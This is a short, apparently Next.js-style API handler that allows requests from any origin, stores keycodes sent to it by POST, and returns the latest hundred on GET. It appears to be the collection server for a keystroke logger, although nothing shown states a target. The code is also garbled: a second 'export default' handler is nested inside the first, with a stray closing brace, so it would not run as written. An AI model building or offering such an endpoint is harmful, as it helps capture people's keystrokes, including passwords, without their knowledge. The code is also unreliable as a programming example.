export default async function handler(req, res) {
  // Allow all origins (for development only)
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  let logs = [];

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { keycode } = req.body;
    if (keycode !== undefined) logs.push(keycode);
    return res.status(200).json({ success: true });
  }

  if (req.method === 'GET') {
    return res.status(200).json(logs.slice(-100));
  }

  res.status(405).json({ error: "Method not allowed" });
}

}
